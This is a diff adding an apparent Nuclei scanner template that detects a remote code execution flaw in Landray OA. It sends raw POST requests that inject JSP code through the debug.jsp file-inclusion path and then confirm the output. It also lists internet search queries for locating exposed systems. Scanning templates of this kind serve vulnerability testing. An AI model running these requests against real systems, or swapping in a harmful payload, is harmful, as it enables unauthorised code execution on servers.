@@ -1,0 +1,40 @@
+id: landray-oa-debug-rce
+info:
+  name: 蓝凌 OA debug.jsp - rce
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/exp999fuck/poc_yaml/blob/main/xray-poc/xray-poc-Landray-debug.jsp-rce.yml
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="Landray-OA系统"
+    hunter-query: app.name="Landray 蓝凌OA"
+    quake-query: favicon:"302464c3f6207d57240649926cfc7bd4"
+    zoomeye-query: app:"蓝凌数字OA"
+  tags: rce,landray,oa
+
+http:
+  - raw:
+      - |
+        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-type: application/x-www-form-urlencoded
+      
+        var={"body":{"file":"/sys/common/debug.jsp"}}&fdCode=out.println("{{randstr}}");
+     
+      - |+
+        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        var={"body":{"file":"/sys/common/code.jsp"}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_1,'code.jsp')
+          - contains(body_2,'{{randstr}}')
+        condition: and
